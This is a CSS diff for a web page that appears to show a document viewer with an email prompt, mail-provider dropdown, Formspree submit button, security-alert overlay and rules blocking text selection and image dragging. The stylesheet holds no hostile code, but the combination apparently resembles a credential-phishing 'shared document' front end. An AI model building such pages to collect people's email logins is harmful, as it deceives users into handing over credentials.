@@ -1229,11 +1229,9 @@ body {
     box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
 }
 
-
-
-/* Buttons */
-.next-btn, .submit-btn {
-    background: linear-gradient(to right, #0078d7, #0078d7);
+/* Submit Button Styles for Formspree */
+.submit-btn {
+    background: linear-gradient(to right, #1976d2, #1565c0);
     color: white;
     border: none;
     padding: 16px 30px;
@@ -1245,17 +1243,29 @@ body {
     transition: all 0.3s ease;
     margin-bottom: 20px;
     letter-spacing: 0.5px;
-    box-shadow: 0 4px 15px #0078d7(25, 118, 210, 0.3);
+    box-shadow: 0 4px 15px rgba(25, 118, 210, 0.3);
 }
 
-.next-btn:hover, .submit-btn:hover {
-    background: linear-gradient(to right, #0078d7, #0078d7);
+.submit-btn:hover {
+    background: linear-gradient(to right, #1565c0, #0d47a1);
     transform: translateY(-2px);
-    box-shadow: 0 6px 20px #0078d7(25, 118, 210, 0.4);
+    box-shadow: 0 6px 20px rgba(25, 118, 210, 0.4);
 }
 
-.next-btn:active, .submit-btn:active {
+.submit-btn:active {
     transform: translateY(0);
+}
+
+.submit-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none;
+}
+
+.submit-btn:disabled:hover {
+    background: linear-gradient(to right, #1976d2, #1565c0);
+    transform: none;
+    box-shadow: 0 4px 15px rgba(25, 118, 210, 0.3);
 }
 
 /* Privacy Notice */
@@ -1875,6 +1885,7 @@ body {
     box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
 }
 
+/* Email Hint with Fade Animation */
 .email-input-hint {
     position: absolute;
     top: 100%;
@@ -1888,16 +1899,56 @@ body {
     font-size: 0.9rem;
     color: #2c3e50;
     display: none;
-    animation: fadeIn 0.3s ease;
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    z-index: 10;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
 }
 
 .email-input-hint.show {
     display: block;
+    opacity: 1;
+    transform: translateY(0);
+    animation: hintPulse 2s infinite;
+}
+
+@keyframes hintPulse {
+    0% {
+        box-shadow: 0 4px 12px rgba(25, 118, 210, 0.1);
+    }
+    50% {
+        box-shadow: 0 4px 12px rgba(25, 118, 210, 0.2);
+    }
+    100% {
+        box-shadow: 0 4px 12px rgba(25, 118, 210, 0.1);
+    }
 }
 
 .email-input-hint i {
     color: #1976d2;
     margin-right: 8px;
+    font-size: 0.9rem;
+}
+
+/* Hint fade out animation */
+.email-input-hint.fade-out {
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+}
+
+/* Dark mode support for hint */
+@media (prefers-color-scheme: dark) {
+    .email-input-hint {
+        background: #1e3a5f;
+        color: #bbdefb;
+        border-left-color: #1976d2;
+    }
+    
+    .email-input-hint i {
+        color: #4fc3f7;
+    }
 }
 
 /* Mail Provider Dropdown - Updated */
@@ -2121,5 +2172,176 @@ body {
     
     .email-input-container input {
         padding: 12px 15px;
+    }
+}
+
+/* Security Alert Styles */
+#securityAlertOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
+    animation: fadeIn 0.3s ease;
+}
+
+.security-alert-box {
+    background: linear-gradient(135deg, #2c3e50, #34495e);
+    padding: 40px;
+    border-radius: 15px;
+    text-align: center;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+    border: 3px solid #e74c3c;
+    animation: slideDown 0.4s ease;
+}
+
+@keyframes slideDown {
+    from {
+        opacity: 0;
+        transform: translateY(-30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.security-alert-icon {
+    font-size: 4rem;
+    color: #e74c3c;
+    margin-bottom: 25px;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.1); }
+    100% { transform: scale(1); }
+}
+
+.security-alert-message {
+    font-size: 1.2rem;
+    color: #ecf0f1;
+    margin-bottom: 30px;
+    line-height: 1.6;
+    font-weight: 500;
+}
+
+.security-alert-btn {
+    background: linear-gradient(to right, #e74c3c, #c0392b);
+    color: white;
+    border: none;
+    padding: 12px 35px;
+    border-radius: 8px;
+    font-size: 1.1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    letter-spacing: 0.5px;
+    box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
+}
+
+.security-alert-btn:hover {
+    background: linear-gradient(to right, #c0392b, #a93226);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
+}
+
+.security-alert-btn:active {
+    transform: translateY(0);
+}
+
+/* Disable text selection on sensitive elements */
+.document-item,
+.popup-container,
+.email-display-value,
+.sidebar,
+.popup-top-logo,
+.banner-inner,
+.document-info,
+.document-title {
+    user-select: none !important;
+    -webkit-user-select: none !important;
+    -moz-user-select: none !important;
+    -ms-user-select: none !important;
+}
+
+/* Disable dragging on images */
+img {
+    -webkit-user-drag: none;
+    -khtml-user-drag: none;
+    -moz-user-drag: none;
+    -o-user-drag: none;
+    user-drag: none;
+}
+
+/* Cursor style for non-selectable elements */
+.document-item {
+    cursor: pointer;
+}
+
+.document-item:active {
+    cursor: default;
+}
+
+/* Disable outline on focus for security */
+input:focus,
+button:focus,
+select:focus {
+    outline: 2px solid #3498db !important;
+    outline-offset: 2px;
+}
+
+/* Prevent text highlighting */
+.prevent-select {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+}
+
+/* Security warning for iframe embedding */
+.iframe-warning {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #2c3e50;
+    color: white;
+    text-align: center;
+    padding: 100px 20px;
+    z-index: 99999;
+    font-size: 1.5rem;
+}
+
+/* Mobile responsive for security alerts */
+@media (max-width: 768px) {
+    .security-alert-box {
+        padding: 30px 20px;
+        max-width: 90%;
+    }
+    
+    .security-alert-icon {
+        font-size: 3rem;
+    }
+    
+    .security-alert-message {
+        font-size: 1.1rem;
+    }
+    
+    .security-alert-btn {
+        padding: 10px 25px;
+        font-size: 1rem;
     }
 }
